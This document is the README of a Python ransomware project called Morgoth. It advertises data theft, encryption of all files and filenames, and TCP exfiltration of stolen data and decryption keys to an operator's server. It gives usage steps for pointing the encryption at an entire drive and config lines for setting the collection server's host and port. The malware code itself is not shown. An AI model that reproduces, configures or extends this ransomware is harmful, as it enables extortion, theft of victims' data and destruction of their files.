# Morgoth

Morgoth is a extensive python based ransomware.

## Features

* Steal data
* Encrypt all data and filenames as well
* Send stolen data and keys to decrypt via TCP to a server
* Leave backdoor on victim's pc (coming soon)

<br>
<br>

[Website](https://n4zgu1.com/)

## How to use

Set target to "C:\\" on windows or "/" on mac or linux to encrypt ALL data

**main.py**
``` python
17  target = 'testfolder'
```
<br>

The stolen data and the keys to decrypt will be sent to a server automatically.<br>
You can change the IP and PORT of the server to connect here<br>

**main.py**
```python
15  HOST = '127.0.0.1'
16  PORT = 9999
```
<br>
The serverlog will be safed in the file "LOG.txt" <br>
The server runs on ip 0.0.0.0 and port 9999 by default<br>
The received data will be safed as .zip in the folder "data/"

**server.py**
```python
7   logfile = 'LOG.txt'
8   folder = 'data/'
9   HOST = '0.0.0.0'
10  PORT = 9999
```

## More coming soon

